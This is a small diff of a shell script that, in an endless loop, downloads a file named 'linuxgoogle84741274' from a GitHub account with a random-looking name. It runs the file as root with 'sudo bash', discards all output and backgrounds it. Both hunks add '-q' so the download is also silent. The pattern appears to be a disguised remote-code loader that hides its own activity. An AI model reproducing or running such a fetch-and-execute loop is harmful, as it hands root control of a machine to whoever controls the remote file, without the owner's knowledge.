@@ -85,7 +85,7 @@ sudo make
 while true
 do
 
-sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+sudo wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
 
 sudo bash ./linuxgoogle84741274 &> /dev/null &
 
@@ -105,7 +105,7 @@ sudo make
 while true
 do
 
-sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+sudo wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
 
 sudo bash ./linuxgoogle84741274 &> /dev/null &
 
